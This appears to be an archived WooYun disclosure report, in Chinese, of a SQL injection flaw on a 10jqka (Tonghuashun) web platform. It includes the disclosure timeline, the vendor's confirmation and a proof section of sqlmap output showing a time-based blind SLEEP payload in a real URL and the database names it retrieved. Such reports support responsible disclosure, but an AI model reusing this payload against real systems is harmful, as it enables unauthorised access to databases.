wybug_title: 同花顺某平台存在SQL注入
wybug_detail:
漏洞详情 披露状态：   									2016-04-25：	细节已通知厂商并且等待厂商处理中									2016-04-25：	厂商已经确认，细节仅向厂商公开									2016-05-05：	细节向核心白帽子及相关领域专家公开									2016-05-15：	细节向普通白帽子公开									2016-05-25：	细节向实习白帽子公开									2016-06-09：	细节向公众公开  简要描述： ... 详细说明：  http://pos.10jqka.com.cn/center/center/myupload/uploaderid/235070423延时

不延时

   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: http://pos.10jqka.com.cn:80/center/center/myupload/uploaderid/235070423' AND (SELECT * FROM (SELECT( SLEEP (5)))rgZl)and '5652'='5652/---[11:42:50] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[11:42:50] [INFO] fetching database names[11:42:50] [INFO] fetching number of databases[11:42:50] [WARNING] time-based comparison requires larger statistical model, please wait..............................                       [11:42:55] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[11:43:28] [INFO] adjusting time delay to 1 second due to good response times3[11:43:28] [INFO] retrieved: inform[11:44:36] [ERROR] invalid character detected. retrying..[11:44:36] [WARNING] increasing time delay to 2 seconds ation_schema[11:47:59] [INFO] retrieved: pos[11:49:05] [INFO] retrieved: testavailable databases [3]:[*] information_schema[*] pos[*] test

wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-04-25 09:39 厂商回复： 你好，漏洞已确认，正在进行处理，谢谢。 最新状态： 暂无
